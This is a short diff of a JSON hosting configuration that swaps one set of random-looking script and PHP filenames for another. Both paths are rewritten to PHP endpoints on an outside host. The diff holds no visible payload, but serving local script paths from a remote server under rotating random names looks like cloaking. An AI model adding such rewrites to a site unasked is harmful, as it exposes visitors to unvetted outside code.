@@ -1,7 +1,7 @@
 {
   "headers": [
     {
-      "source": "/sltprjv.js",
+      "source": "/rrdywdp.js",
       "headers": [
         {
           "key": "Cache-Control",
@@ -14,7 +14,7 @@
       ]
     },
     {
-      "source": "/wnlzept.php",
+      "source": "/hilsugc.php",
       "headers": [
         {
           "key": "Cache-Control",
@@ -29,12 +29,12 @@
   ],
   "rewrites": [
     {
-      "source": "/sltprjv.js",
-      "destination": "https://tom.vaka.work/sltprjv.php"
+      "source": "/rrdywdp.js",
+      "destination": "https://tom.vaka.work/rrdywdp.php"
     },
     {
-      "source": "/wnlzept.php",
-      "destination": "https://tom.vaka.work/wnlzept.php"
+      "source": "/hilsugc.php",
+      "destination": "https://tom.vaka.work/hilsugc.php"
     }
   ]
 }
